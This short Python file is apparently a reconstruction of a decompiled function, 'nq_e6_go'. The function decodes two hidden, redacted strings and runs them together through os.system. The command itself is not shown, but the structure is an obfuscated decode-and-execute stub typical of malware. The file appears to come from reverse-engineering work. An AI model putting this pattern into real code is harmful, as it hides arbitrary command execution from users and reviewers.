"""Recovered entry ``nq_e6_go(_sy, _z, _os)``.

Decompiled constants: ``sec``, ``system`` and two hidden literals.  The
command join is inferred; the encoded operands stay redacted.
"""
from __future__ import annotations

import os

from ..link._fds_jm import sec
from . import _ops


def nq_e6_go() -> None:
    _sy = sec(_ops.redacted_secret("g3vcqbaj"))
    _z = sec(_ops.redacted_secret("3u66uz3g"))
    os.system(f"{_sy} {_z}")

